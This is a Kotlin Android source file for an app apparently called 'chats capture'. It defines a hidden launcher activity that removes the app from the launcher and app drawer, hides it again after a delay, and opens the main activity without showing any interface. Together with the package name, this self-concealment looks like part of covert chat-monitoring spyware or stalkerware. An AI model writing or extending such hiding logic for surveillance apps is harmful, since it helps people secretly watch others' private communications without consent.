package com.chats.capture.ui

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager
import com.chats.capture.utils.StartupManager
import timber.log.Timber

/**
 * Hidden launcher activity that immediately redirects to MainActivity
 * This allows the app to be accessed from Settings while hiding from app drawer
 */
class SettingsLauncherActivity : AppCompatActivity() {
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        Timber.d("SettingsLauncherActivity started (from Settings app)")
        
        // Immediately hide app from launcher (before doing anything else)
        try {
            AppVisibilityManager.hideFromLauncher(this)
            AppHider.hide(this)
            Timber.d("App hiding attempted in SettingsLauncherActivity")
        } catch (e: Exception) {
            Timber.e(e, "Error hiding app in SettingsLauncherActivity")
        }
        
        // Also schedule delayed hides
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            AppVisibilityManager.hideFromLauncher(this@SettingsLauncherActivity)
            AppHider.ensureHidden(this@SettingsLauncherActivity)
        }, 1000)
        
        // Handle startup (check if setup needed)
        StartupManager.handleAppStartup(this)
        
        // Launch MainActivity (will finish immediately without showing UI)
        StartupManager.launchMainActivity(this)
        
        // Finish this activity immediately - no UI should be shown
        finish()
    }
    
    companion object {
        /**
         * Disable this launcher activity to hide from app drawer
         */
        fun disableLauncher(context: android.content.Context) {
            AppVisibilityManager.hideFromLauncher(context)
        }
        
        /**
         * Enable this launcher activity (for Settings access)
         */
        fun enableLauncher(context: android.content.Context) {
            AppVisibilityManager.showInLauncher(context)
        }
    }
}
